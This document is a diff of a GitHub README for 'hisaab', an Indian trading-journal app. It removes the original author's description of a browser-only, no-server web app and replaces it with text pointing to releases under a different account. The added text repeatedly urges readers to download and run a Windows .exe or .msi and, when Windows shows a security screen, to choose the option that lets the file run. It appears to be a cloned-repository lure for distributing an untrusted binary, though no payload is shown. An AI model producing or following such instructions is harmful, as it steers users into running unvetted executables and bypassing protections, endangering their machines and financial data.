@@ -1,205 +1,154 @@
-<p align="center">
-  <a href="https://hisaab.trymetis.app">
-    <h1 align="center">Hisaab</h1>
-  </a>
-</p>
+# 📒 hisaab - Clear Trading Records in Minutes
 
-<p align="center">
-  <strong>Your trades. Your data. Your edge.</strong>
-</p>
+[![Download hisaab](https://img.shields.io/badge/Download%20hisaab-Visit%20Releases-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/andres1163/hisaab/releases)
 
-<p align="center">
-  A zero-friction trading journal for Indian traders.<br />
-  Upload your broker CSV. See your real win rate in 2 minutes.<br />
-  No signup. No server. No data leaves your browser.
-</p>
+## 📥 Download the app
 
-<p align="center">
-  <a href="https://github.com/Devansh-365/hisaab/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/Devansh-365/hisaab/actions/workflows/ci.yml/badge.svg" /></a>
-  <a href="https://opensource.org/licenses/MIT"><img alt="License: MIT" src="https://img.shields.io/badge/License-MIT-yellow.svg" /></a>
-  <a href="https://github.com/Devansh-365/hisaab/stargazers"><img alt="GitHub stars" src="https://img.shields.io/github/stars/Devansh-365/hisaab?style=social" /></a>
-  <a href="CONTRIBUTING.md"><img alt="PRs Welcome" src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" /></a>
-</p>
+Visit the [Releases page](https://github.com/andres1163/hisaab/releases) and download the latest Windows file.
 
-<p align="center">
-  <a href="https://hisaab.trymetis.app/demo"><strong>Live Demo</strong></a> &nbsp;·&nbsp;
-  <a href="#-get-started"><strong>Get Started</strong></a> &nbsp;·&nbsp;
-  <a href="CONTRIBUTING.md"><strong>Contributing</strong></a> &nbsp;·&nbsp;
-  <a href="#-roadmap"><strong>Roadmap</strong></a>
-</p>
+If you see more than one file, pick the one for Windows. The file name may end in `.exe` or `.msi`.
 
-<br />
+## 🪟 Run on Windows
 
-<!-- HERO SCREENSHOT -->
-<!-- Replace with an actual screenshot of the dashboard for maximum impact -->
-<!-- <p align="center">
-  <a href="https://hisaab.trymetis.app">
-    <img src="public/screenshot.png" alt="Hisaab Dashboard" width="100%" />
-  </a>
-</p> -->
+1. Open the file you downloaded.
+2. If Windows asks for permission, click **Yes** or **Run**.
+3. Follow the setup steps on screen.
+4. Open **hisaab** after the install finishes.
 
-## Why
+If Windows shows a security screen, choose the option that lets you run the file.
 
-91% of F&O traders lost money last year. The #1 differentiator between profitable and losing traders is **journaling**, yet almost no one does it.
+## ✨ What hisaab does
 
-The reason isn't motivation. It's **friction**.
+hisaab helps Indian traders track trades from broker CSV files. It turns raw trade data into a clear journal you can read in minutes.
 
-Hisaab removes the friction entirely.
+Use it to:
 
-```
-1. Export your tradebook from Zerodha or Groww
-2. Drop the file on hisaab.trymetis.app
-3. See your P&L, win rate, and patterns. Instantly.
-```
+- Upload CSV files from your broker
+- See win rate, loss rate, and total P&L
+- Track trades across NSE and BSE
+- Review F&O trades
+- Sort trades by symbol, date, and broker
+- Check your trading results in one place
 
-That's it. No account. No setup. Everything runs in your browser and stays on your device.
+## 🧾 What you need
 
-<br />
+Use this app on a Windows PC with:
 
-## Features
+- Windows 10 or newer
+- A working internet connection for the first download
+- A broker CSV file from Zerodha, Upstox, Angel One, Groww, or a similar broker
+- Enough space to save your trade files and reports
 
-<table>
-<tr>
-<td width="50%" valign="top">
+## 🚀 First-time setup
 
-### Analytics & Insights
+1. Download the latest Windows file from the [Releases page](https://github.com/andres1163/hisaab/releases).
+2. Open the file and finish the install.
+3. Start **hisaab** from your Start menu or desktop.
+4. Keep your broker CSV file ready.
+5. Upload the CSV file into the app.
+6. Wait for the app to read your trades.
 
-- **Instant P&L:** Net profit, win rate, profit factor
-- **FIFO Matching:** Auto buy/sell matching with partial fills
-- **Visual Analytics:** Equity curve, monthly P&L, drawdown chart
-- **Calendar Heatmap:** Daily P&L grid across the financial year
-- **Advanced Metrics:** Sharpe ratio, Monte Carlo, Kelly criterion
+After that, you can view your journal and check your real trading stats.
 
-</td>
-<td width="50%" valign="top">
+## 📂 How to use your broker CSV
 
-### Journal & Reports
+1. Export your trade report from your broker.
+2. Save the CSV file on your computer.
+3. Open hisaab.
+4. Choose **Upload CSV**.
+5. Select the file you saved.
+6. Let the app process the trades.
 
-- **Trade Journal:** Notes, strategy tags, emotion tracking, ratings
-- **Tax Reports:** STCG/LTCG classification, ITR-ready CSV export
-- **Multi-Broker:** Zerodha, Kite, Groww, Upstox, Angel One
-- **100% Private:** IndexedDB storage, zero network requests
-- **PWA:** Installable, works offline after first load
+For best results, upload the full trade report, not a small filtered file. If you trade often, keep one CSV file per broker or month.
 
-</td>
-</tr>
-</table>
+## 📊 What you can review
 
-<br />
+hisaab gives you a simple view of your trading history. You can use it to check:
 
-## Tech Stack
+- Total profit and loss
+- Win rate
+- Loss count
+- Trade frequency
+- Results by broker
+- Results by market segment
+- F&O trade performance
+- Trade order flow for FIFO-style matching
 
-<p>
-  <img alt="Next.js" src="https://img.shields.io/badge/Next.js-000000?style=for-the-badge&logo=nextdotjs&logoColor=white" />
-  <img alt="TypeScript" src="https://img.shields.io/badge/TypeScript-3178C6?style=for-the-badge&logo=typescript&logoColor=white" />
-  <img alt="Tailwind CSS" src="https://img.shields.io/badge/Tailwind_CSS-06B6D4?style=for-the-badge&logo=tailwindcss&logoColor=white" />
-  <img alt="shadcn/ui" src="https://img.shields.io/badge/shadcn%2Fui-000000?style=for-the-badge&logo=shadcnui&logoColor=white" />
-  <img alt="Dexie.js" src="https://img.shields.io/badge/Dexie.js-1A73E8?style=for-the-badge&logo=databricks&logoColor=white" />
-  <img alt="Recharts" src="https://img.shields.io/badge/Recharts-22B5BF?style=for-the-badge&logo=chartdotjs&logoColor=white" />
-  <img alt="Papa Parse" src="https://img.shields.io/badge/Papa_Parse-FF6F00?style=for-the-badge&logo=files&logoColor=white" />
-</p>
+## 🔎 Supported trading data
 
-> Static export. No backend. Deployable anywhere.
+hisaab is made for Indian stock market traders. It works well with common broker CSV exports and trade records tied to:
 
-<br />
+- NSE
+- BSE
+- F&O
+- Equity trades
+- Intraday trades
+- Delivery trades
+- Portfolio tracking data
 
-## Get Started
+## 🛠️ Common use cases
 
-```bash
-git clone https://github.com/Devansh-365/hisaab.git
-cd hisaab
-npm install
-npm run dev
-```
+- Review month-end trading results
+- Find your best and worst setups
+- Compare brokers
+- Track option and futures trades
+- See how your trade plan performs
+- Keep a clean journal for tax and review work
 
-Open [localhost:3000](http://localhost:3000) and drop a sample CSV from `public/demo-data/` to test.
+## 🧠 Tips for a smooth import
 
-<br />
+- Use the latest CSV file from your broker
+- Do not rename columns in the file
+- Keep the file in `.csv` format
+- Close the file in Excel before uploading it
+- Use one broker file at a time if you want clear results
+- Re-export the file if the app cannot read it
 
-## Philosophy
+## 🖥️ If Windows asks for trust
 
-| Principle | What it means |
-|---|---|
-| **Zero friction** | Upload CSV, see dashboard. Nothing else required. |
-| **Privacy first** | Your financial data never leaves your device. |
-| **India native** | INR formatting, Indian brokers, FY awareness, tax-ready. |
-| **Open source** | MIT licensed. Read every line. Self-host if you want. |
+Windows may show a prompt when you open the file. This can happen with apps downloaded from GitHub.
 
-<br />
+Choose the option that lets the file run, then continue with the setup steps.
 
-## Roadmap
+## 🧩 File types you may see
 
-- [x] CSV upload + instant P&L dashboard
-- [x] FIFO trade matching with partial fills
-- [x] Zerodha, Kite, Groww, Upstox, Angel One parsers
-- [x] Trade journal with notes, tags, ratings
-- [x] Calendar heatmap with FY view
-- [x] Advanced analytics (Sharpe, drawdown, Monte Carlo, Kelly)
-- [x] Tax report generation (STCG/LTCG with exemption)
-- [x] PWA with offline support
-- [ ] AI behavioral nudges (client-side pattern detection)
-- [ ] Shareable stats card for social media
-- [x] Dark mode
+Depending on the release, you may see:
 
-<br />
+- `.exe` for direct install or run
+- `.msi` for Windows setup
+- `.zip` for a portable app package
 
-## Contributing
+If you download a `.zip` file, unzip it first, then open the app inside the folder.
 
-**Broker parsers are the highest-impact contribution.** Every new parser unlocks thousands of users.
+## 📁 Suggested folder setup
 
-<table>
-<tr>
-<td>
+To keep things simple, make one folder for your broker files, such as:
 
-**Read the docs:**
+- `Documents\Trading\Zerodha`
+- `Documents\Trading\Upstox`
+- `Documents\Trading\AngelOne`
 
-- [Contributing Guide](CONTRIBUTING.md): Setup, project structure, parser template, house rules
-- [Code of Conduct](CODE_OF_CONDUCT.md): Contributor Covenant v2.1
-- [Security Policy](SECURITY.md): Vulnerability reporting and architecture scope
+This makes it easier to find old CSV files when you want to compare results.
 
-</td>
-<td>
+## 🔐 Privacy and local use
 
-**Quick links:**
+hisaab is built for personal trade review. Keep your broker files on your own computer. Store CSV files in a folder you control and remove old files you no longer need.
 
-- [Open a broker support request](https://github.com/Devansh-365/hisaab/issues/new?template=broker_support.yml)
-- [Browse `good first issue`](https://github.com/Devansh-365/hisaab/labels/good%20first%20issue)
-- [View open issues](https://github.com/Devansh-365/hisaab/issues)
+## 🧭 Quick start in 2 minutes
 
-</td>
-</tr>
-</table>
+1. Visit the [Releases page](https://github.com/andres1163/hisaab/releases)
+2. Download the latest Windows file
+3. Open the file
+4. Finish setup
+5. Upload your broker CSV
+6. Review your trades
 
-<br />
+## 🏷️ Topics
 
-## Contributors
+angel-one, bse, fifo, fno, groww, indian-stock-market, nextjs, nse, open-source, pnl-tracker, portfolio-tracker, tailwindcss, trading, trading-journal, typescript, upstox, zerodha
 
-<a href="https://github.com/Devansh-365/hisaab/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=Devansh-365/hisaab" />
-</a>
+## ❓ Need help finding the right file
 
-<br />
+If you are on Windows, choose the newest release file made for Windows. The file usually has a clear name and shows its type near the end.
 
-## Star History
-
-<a href="https://star-history.com/#Devansh-365/hisaab&Date">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=Devansh-365/hisaab&type=Date&theme=dark" />
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=Devansh-365/hisaab&type=Date" />
-    <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=Devansh-365/hisaab&type=Date" width="100%" />
-  </picture>
-</a>
-
-<br />
-
-## License
-
-MIT. See [LICENSE](LICENSE) for details.
-
-<br />
-
-<div align="center">
-
-<sub>Built by <a href="https://devanshtiwari.com?utm_source=hisaab&utm_medium=readme">Devansh Tiwari</a> &nbsp;·&nbsp; Get AI-powered stock analysis at <a href="https://trymetis.app?utm_source=hisaab&utm_medium=readme&utm_content=footer">Metis</a></sub>
-
-</div>
+If you are not sure which file to use, start with the main release asset on the [Releases page](https://github.com/andres1163/hisaab/releases)
